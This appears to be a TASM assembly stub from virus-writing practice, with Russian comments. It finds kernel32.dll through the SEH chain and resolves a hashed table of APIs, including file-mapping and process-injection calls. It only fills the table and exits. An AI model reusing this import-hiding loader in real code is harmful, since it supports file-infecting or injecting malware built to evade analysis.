;Tasm32.exe /m5 /ml *.asm
;Tlink32.exe /Tpe /aa /c /x *.obj

includelib c:\tasm\lib\import32.lib

extrn ExitProcess: PROC
	
.386
.model	flat

.code
start:
	call	delta
delta:
	pop		ebp
	sub		ebp,offset delta

	call	GetAPIs

_exit:
	push	0
	call	ExitProcess
	ret

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; input:
 ;      EBP - delta offset
 ;      + APITable
 ; output:
 ;      заполненная APITable

GetAPIs		proc
	lea		edi,[ebp+APITable]	; EDI - указатель на адрес начала таблицы хэшей имен функций
_ReadSEH:
	xor		edx,edx
	mov		eax,fs:[edx]
	dec		edx
_SearchK32:
	cmp		[eax],edx
	je		_CheckK32
	mov		eax,dword [eax]
	jmp		_SearchK32

_CheckK32:
	mov		eax,[eax+4]
	xor		ax,ax

_SearchMZ:
	cmp		word ptr [eax],5A4Dh	; проверка, "MZ"?
	je		_CheckPE
	sub		eax,10000h
	jmp		_SearchMZ

_CheckPE:	; EAX - указатель на начало файла kernel32.dll в памяти
	mov		edx,[eax+3ch]	; EDX - указатель на PE-заголовок, 3Ch смещение от начала файла
	cmp		word ptr [eax+edx],4550h	; проверка, "PE"?
	jne		_Exit

_SearchAPI:
	push	esp                   ; сохранить оригинальный esp
	mov		esi,[eax+edx+78h]     ;Export Table RVA
	add		esi,eax               ;Export Table VA
	add		esi,18h
	xchg	eax,ebx               ;EBX = Kernel32 base
	lodsd                         ;Number Of Names
	push	eax
	lodsd                         ;Address Of Functions
	push	eax
	lodsd                         ;Address Of Names 
	push	eax 
	add		eax,ebx
	push	eax                   ;Index - указатель на 1-ое имя ф-ии
	lodsd                         ;Address Of Name Ordinals 
	push	eax

_BeginSearch:
	mov		ecx,[esp+4*4]             ;Number Of Names
	xor		edx,edx

_SearchAPIName:
	mov		esi,[esp+4*1]             ;Index                                                     
	mov		esi,[esi]
	add		esi,ebx                   ;ESI = имя функции

_GetHash:
	xor		eax,eax
	push	eax
_CalcHash:
	ror		eax,7
	xor		[esp],eax
	lodsb
	test	al,al
	jnz		_CalcHash
	pop		eax

_OkHash:
	cmp		eax,dword ptr [edi]
	je		_OkAPI
	add		dword ptr [esp+4*1],4     ;I=I+4 (I--Index)
	inc		edx
	loop	_SearchAPIName 
	jmp		_Exit                     ; искомые функции не найдены :(

_OkAPI:
	shl		edx,1
	mov		ecx,[esp]                 ;OrdinalTableRVA
	add		ecx,ebx
	add		ecx,edx
	mov		ecx,[ecx]
	and		ecx,0FFFFh
	mov		edx,[esp+4*3]             ;AddressTableRVA
	add		edx,ebx
	shl		ecx,2
	add		edx,ecx
	mov		edx,[edx]
	add		edx,ebx

	add		edi,4
	mov		dword ptr [edi],edx

	add		edi,4

	cmp		word ptr [edi],00000h
	je		_NextDll

	cmp word ptr [edi],0FFFFh   ;0FFFFh-End of HeshTable
	je _Exit

_NextName:
	mov		ecx,[esp+4*2]             ;NamePointersRVA
	add		ecx,ebx
	mov		[esp+4*1],ecx             ;Index
	jmp		short _BeginSearch

_NextDll:
	mov		esp,[esp+4*5]
	add		edi,2
	push	edi
	call	[ebp+@GetModuleHandleA]
	test	eax,eax
	jz		_Exit		; если в программе не используется данная библиотека, то получить адреса функций не удастся
_skip:		; переводим указатель на следующий хэш библиотеки
	inc		edi
	cmp		byte ptr [edi-1],0
	jne		_skip

	jmp		_CheckPE

_Exit:
	mov		esp,[esp+4*5]
	ret

GetAPIs         endp

APITable:			; kernel32.dll
							dd 00F191CF4h
	@GetModuleHandleA		dd 0
							dd 0860B38BCh
	@CreateFileA			dd 0
							dd 0AAC2523Eh
	@GetFileSize			dd 0
							dd 03D7D6496h
	@GetFileAttributesA		dd 0
							dd 07F3545C6h
	@SetFilePointer			dd 0
							dd 0152DC5D4h
	@SetFileAttributesA		dd 0
							dd 0F867A91Eh
	@CloseHandle			dd 0
							dd 01F394C74h
	@CreateFileMappingA		dd 0
							dd 0FC6FB9EAh
	@MapViewOfFile			dd 0
							dd 0CA036058h
	@UnmapViewOfFile		dd 0
							dd 0059C5E24h
	@SetEndOfFile			dd 0
							dd 015F8EF80h
	@VirtualProtect			dd 0
							dd 0A89EA31Ah
	@GetCurrentProcess		dd 0
							dd 0FE33F9AEh
	@OpenProcess			dd 0
							dd 0632466F0h
	@VirtualAllocEx			dd 0
							dd 0B0869BCAh
	@ReadProcessMemory		dd 0
							dd 06F39E536h
	@WriteProcessMemory		dd 0
							dd 05D7574B6h
	@GetProcAddress			dd 0
							dw 0
							db "user32.dll",0
							dd 0AC8672A8h
	@GetActiveWindow		dd 0
							dd 06558FEC2h
	@GetWindowThreadProcessId	dd 0
							dd 09027F11Eh
	@FindWindow				dd 0
							dw 0FFFFh
end	start